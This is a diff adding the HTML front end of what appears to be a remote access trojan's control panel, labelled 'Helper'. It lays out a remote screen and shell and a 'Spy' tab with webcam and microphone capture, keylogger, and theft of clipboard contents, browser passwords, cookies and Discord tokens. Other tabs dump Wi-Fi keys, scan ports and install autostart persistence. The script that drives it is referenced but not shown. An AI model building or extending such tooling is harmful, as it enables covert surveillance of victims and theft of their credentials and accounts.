@@ -1,0 +1,162 @@
+<!doctype html><meta charset=utf-8><title>Helper</title>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<link rel=stylesheet href="/s/style.css">
+<div id="app">
+
+  <aside id="rail">
+    <div class="mark"></div>
+    <button data-t="dash" class="on" title="Dashboard"><i>◈</i><span>Home</span></button>
+    <button data-t="screen" title="Screen"><i>▣</i><span>Screen</span></button>
+    <button data-t="files" title="Files"><i>❐</i><span>Files</span></button>
+    <button data-t="spy" title="Spy"><i>◉</i><span>Spy</span></button>
+    <button data-t="net" title="Network"><i>⌁</i><span>Net</span></button>
+    <button data-t="sys" title="System"><i>▤</i><span>System</span></button>
+    <button data-t="cmd" title="Terminal"><i>❯</i><span>Shell</span></button>
+    <button data-t="log" title="Activity"><i>≡</i><span>Log</span></button>
+    <div class="spacer"></div>
+    <button id="power" title="Power"><i>⏻</i><span>Power</span></button>
+    <div id="dot" class="dot"></div>
+  </aside>
+
+  <div id="body">
+    <header id="bar">
+      <div class="crumb"><span id="host">—</span><em id="title">Dashboard</em></div>
+      <div class="tools">
+        <button id="palette">⌘K</button>
+        <span id="stat" class="tag">idle</span>
+      </div>
+    </header>
+
+    <main id="view">
+
+      <section id="p-dash" class="p on">
+        <div class="gauges" id="gauges"></div>
+        <div class="grid2">
+          <div class="card"><h3>Machine</h3><div id="facts" class="facts"></div></div>
+          <div class="card"><h3>Load</h3><canvas id="chart" height="130"></canvas>
+            <div class="legend"><b class="l1"></b>CPU<b class="l2"></b>RAM</div></div>
+        </div>
+        <div class="card"><h3>Quick actions</h3><div id="quick" class="chips"></div></div>
+      </section>
+
+      <section id="p-screen" class="p">
+        <div class="toolbar">
+          <button id="sstart" class="pri">▶ Start</button>
+          <button id="sstop">■ Stop</button>
+          <button id="sauto" class="on">Auto</button>
+          <label>FPS<input id="sfps" type="range" min="2" max="60" value="30"><b id="sfpsv">30</b></label>
+          <label>Q<input id="sq" type="range" min="20" max="90" value="60"><b id="sqv">60</b></label>
+          <label>Scale<input id="ssc" type="range" min="25" max="100" value="100"><b id="sscv">100%</b></label>
+          <select id="smon"></select>
+          <button id="sfull">⤢</button>
+          <span class="tag" id="smeter">0/s</span>
+        </div>
+        <div id="stage"><canvas id="cv" tabindex="0"></canvas></div>
+        <div class="foot">Click, right-click and scroll to control · keyboard captured while this view is open · pauses when you switch tabs</div>
+      </section>
+
+      <section id="p-files" class="p">
+        <div class="toolbar">
+          <button id="fup">↑</button><input id="fpath" placeholder="C:\"><button id="fgo">Go</button>
+          <button id="fnew">+ Folder</button>
+          <label class="btn">Upload<input id="fupl" type="file" multiple hidden></label>
+          <button id="fsearch">Find</button><span class="tag" id="fmeta"></span>
+        </div>
+        <div id="drives" class="chips"></div>
+        <div id="drop">release to upload</div>
+        <div id="ulq" class="upq hidden"><i></i><span></span></div>
+        <div id="flist" class="list"></div>
+        <div id="editor" class="modal hidden">
+          <div class="sheet">
+            <div class="shead"><b id="ename"></b>
+              <button id="esave" class="pri">Save</button><button id="eclose">Close</button></div>
+            <textarea id="etext" spellcheck="false"></textarea>
+          </div>
+        </div>
+        <div id="viewer" class="modal hidden"><img id="vimg"><button id="vclose" class="pri">Close</button></div>
+      </section>
+
+      <section id="p-spy" class="p">
+        <div class="grid2">
+          <div class="card"><h3>Webcam <span id="camstate" class="tag">off</span></h3>
+            <img id="cam" class="shot">
+            <div class="chips">
+              <select id="camidx"></select>
+              <button id="camshot">Grab</button>
+              <button id="camloop">Go live</button>
+              <button id="camstop">Release</button>
+            </div>
+            <p class="hint">Grab blips the LED. Live holds it on until Release.</p>
+          </div>
+          <div class="card"><h3>Microphone</h3>
+            <div class="chips"><input id="msec" type="number" value="6" min="1" max="120">
+              <button id="mrec">Record</button></div>
+            <audio id="aud" controls></audio>
+            <h3 style="margin-top:14px">Active window</h3><pre id="active">—</pre>
+            <div class="facts"><span>idle</span><b id="idle">0</b>s</div>
+          </div>
+          <div class="card"><h3>Clipboard</h3><pre id="clip">—</pre>
+            <div class="chips"><input id="clips" placeholder="set clipboard"><button id="clipset">Set</button></div>
+          </div>
+          <div class="card"><h3>Keylogger</h3>
+            <div class="chips"><button id="kon">Start</button><button id="koff">Stop</button>
+              <button id="kclr">Clear</button><button id="kdl">Download</button></div>
+            <pre id="kb" class="keylog"></pre>
+          </div>
+          <div class="card wide"><h3>Browser data</h3>
+            <div class="chips"><button data-a="passwords">Passwords</button><button data-a="cookies">Cookies</button>
+              <button data-a="history">History</button><button data-a="dtoken">Discord token</button></div>
+            <pre id="bout" class="out"></pre>
+          </div>
+        </div>
+      </section>
+
+      <section id="p-net" class="p">
+        <div class="chips" id="netbtns">
+          <button data-a="wifi">Wi-Fi + keys</button><button data-n="adapters">Adapters</button>
+          <button data-n="proxy">Proxy</button><button data-n="arp">ARP</button>
+          <button data-n="route">Routes</button><button data-n="netstat">Connections</button>
+          <button data-n="dns">DNS</button><button data-n="shares">Shares</button>
+          <button data-n="fw">Firewall</button>
+        </div>
+        <div class="card"><h3>Port scan</h3>
+          <div class="chips"><input id="pshost" value="127.0.0.1"><input id="psa" type="number" value="1">
+            <input id="psb" type="number" value="1024"><button id="psgo">Scan</button></div>
+          <pre id="psout" class="out"></pre></div>
+        <div id="netout"></div>
+      </section>
+
+      <section id="p-sys" class="p">
+        <div class="gauges" id="sysgauges"></div>
+        <div class="chips">
+          <button data-a="services">Services</button><button data-a="startup">Startup</button>
+          <button data-a="scheduled">Scheduled tasks</button><button data-a="users">Users</button>
+          <button data-a="admins">Admins</button><button data-a="installed">Installed</button>
+          <button data-a="patches">Hotfixes</button><button data-a="env">Environment</button>
+          <button data-a="hosts">hosts</button><button data-a="status">Persistence</button>
+          <button data-a="persist" class="pri">Install autostart</button>
+          <button data-a="unpersist">Remove autostart</button>
+        </div>
+        <div class="card"><h3>Output</h3><pre id="sysout" class="out tall"></pre></div>
+        <div class="card"><h3>Processes <input id="pfilter" placeholder="filter"></h3><div id="procs"></div></div>
+      </section>
+
+      <section id="p-cmd" class="p">
+        <div class="toolbar"><button id="cmdmode">cmd</button><span class="tag" id="cwd"></span>
+          <button id="cclr" class="right">Clear</button></div>
+        <pre id="cout" class="term"></pre>
+        <div class="toolbar"><input id="cin" placeholder="command + Enter" autocomplete="off">
+          <button id="cgo" class="pri">Run</button></div>
+      </section>
+
+      <section id="p-log" class="p"><div class="card"><h3>Activity <button id="logclr" class="right">Clear</button></h3>
+        <pre id="log" class="out tall"></pre></div></section>
+
+    </main>
+  </div>
+</div>
+
+<div id="pal" class="modal hidden"><div class="palette">
+  <input id="palq" placeholder="Jump to…" autocomplete="off"><div id="palr"></div></div></div>
+<div id="toasts"></div>
+<script src="/s/app.js"></script>
